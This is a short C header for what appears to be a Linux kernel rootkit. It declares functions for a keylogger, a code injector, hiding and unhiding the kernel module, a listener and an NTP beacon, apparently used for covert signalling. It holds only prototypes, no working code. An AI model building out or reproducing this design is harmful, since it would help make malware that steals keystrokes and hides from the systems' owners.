#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/kernel.h>
#include "config.h"

int keylogger_init(void);
void keylogger_cleanup(void);

int injector_init(void);
void injector_cleanup(void);

void hide_module(void);
void unhide_module(void);

int listener_init(void);
void listener_cleanup(void);

int send_ntp_beacon(void);

#endif // ROOTKIT_H
